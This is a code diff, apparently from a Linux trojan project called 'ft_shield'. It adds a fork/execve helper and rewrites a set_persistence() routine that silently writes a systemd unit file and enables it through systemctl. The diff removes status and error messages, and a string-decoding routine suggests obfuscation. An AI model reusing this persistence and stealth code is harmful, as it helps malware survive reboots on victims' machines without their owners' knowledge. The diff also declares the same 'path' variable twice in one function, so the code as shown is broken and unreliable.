@@ -7,6 +7,21 @@ void ft_shutdown(t_args *args) {
     free(args);
 }
 
+void run(char *const argv[], const char *path) {
+    pid_t pid = fork();
+
+    extern char **environ;
+    if (pid == 0) {
+        execve(path, argv, environ);
+        sc(SYS_exit, EXIT_FAILURE);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+            return;
+        }
+    }
+}
 
 void decode(int *data, char *decoded, int key, int n) {
     memset(decoded, 0, 50);
@@ -18,15 +33,17 @@ void decode(int *data, char *decoded, int key, int n) {
 void set_persistence() {
     const char *path = "/etc/systemd/system/ft_shield.service";
     int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
+    const char *path = "/bin/systemctl";
     if (fd < 0) {
-        perror("open : ");
         return ;
-    } else {
-        write(1, "service file created\n", 22);
     }
     sc(SYS_write, fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
 
-    system("systemctl daemon-reexec");
-    system("systemctl enable /etc/systemd/system/ft_shield.service");
-    close(fd);
+
+    char *cmd1[] = {"systemctl", "daemon-reexec", NULL};
+    char *cmd2[] = {"systemctl", "enable", "/etc/systemd/system/ft_shield.service", NULL};
+
+    run(cmd1, path);
+    run(cmd2, path);
+    sc(SYS_close, fd);
 }
